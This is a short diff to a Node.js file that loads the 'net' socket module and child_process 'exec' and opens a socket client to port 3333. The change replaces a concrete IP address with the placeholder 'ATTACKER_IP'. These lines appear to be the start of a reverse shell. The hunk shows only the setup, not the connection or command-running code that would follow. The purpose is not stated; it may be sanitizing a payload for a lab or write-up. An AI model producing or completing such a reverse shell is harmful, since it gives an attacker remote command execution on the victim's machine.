@@ -1,6 +1,7 @@
 const net = require('net');
 const { exec } = require('child_process');
-const host = '172.26.33.46';
+
+const host = 'ATTACKER_IP';
 const port = 3333;
 
 const client = new net.Socket();
